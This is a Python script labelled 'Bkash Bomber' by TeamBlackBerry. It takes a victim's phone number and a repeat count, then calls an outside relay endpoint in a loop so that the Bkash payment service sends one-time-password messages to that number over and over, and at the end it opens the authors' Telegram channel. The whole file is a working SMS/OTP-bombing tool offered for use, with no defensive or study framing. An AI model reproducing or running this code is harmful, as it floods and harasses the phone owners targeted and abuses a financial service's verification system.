# if you copy this give me credit 
import requests
import socket
import time
import os
import webbrowser

def is_internet_available():
    try:
      
        socket.create_connection(("8.8.8.8", 53), timeout=5)
        return True
    except OSError:
        pass
    return False

def print_with_magic(text, color_code):
    print(f"\033[{color_code}m{text}\033[0m")
    time.sleep(0.1)  


if not is_internet_available():
    print_with_magic("Turn on your data or wifi. ❌", 91)  
    exit()


os.system('clear')  


ascii_art = [
    "┌──────────────────────────────┐",
    "│██████   ██████  ███    ███ ██████  │",
    "│██   ██ ██    ██ ████  ████ ██   ██ │",
    "│██████  ██    ██ ██ ████ ██ ██████  │",
    "│██   ██ ██    ██ ██  ██  ██ ██   ██ │",
    "│██████   ██████  ██      ██ ██████  │",
    "└──────────────────────────────┘",
    "         Author: Md.Arman Hussen         ",
    "           Github: TeamBlackBerry            ",
    "          Tool: Bkash Bomber               ",
    "           Coder: Arman                      ",
    "└──────────────────────────────┘"
]

color_codes = [91, 93, 92, 94, 95]  

terminal_width = os.get_terminal_size().columns

for line in ascii_art:
    padding = (terminal_width - len(line)) // 2
    print_with_magic(" " * padding + line, color_codes[ascii_art.index(line) % len(color_codes)])

if not is_internet_available():
    print_with_magic("Data or wifi turned off. ❌ Please turn on your data or wifi.", 91)  
    exit()


number = input("[\033[1;32m*\033[0m] \033[1;31m Enter Number: \033[0m")


if not is_internet_available():
    print_with_magic("Data or wifi turned off. Please turn on your data and wifi.", 91)  
    exit()


repeated_by = int(input("[\033[1;32m*\033[0m] \033[1;31m Enter Amount: \033[0m"))

def send_otp(number):
    api_url = f"https://bkashbomber.armanhasansanto.repl.co/index.php?hash=bkash2024&number={number}"
    response = requests.get(api_url)

    if response.status_code == 200:
        print(f"\033[1;32mOTP sent to {number} ✅\033[0m")
    else:
        print(f"\033[1;31mFailed to send OTP to {number} ❌\033[0m")

successful_otp_sends = []

for i in range(repeated_by):
    send_otp(number)
    successful_otp_sends.append(i + 1)

telegram_channel_url = "https://t.me/teamblackberry"
if successful_otp_sends:
    print_with_magic("Thanks for using!", 92)  
    webbrowser.open(telegram_channel_url)
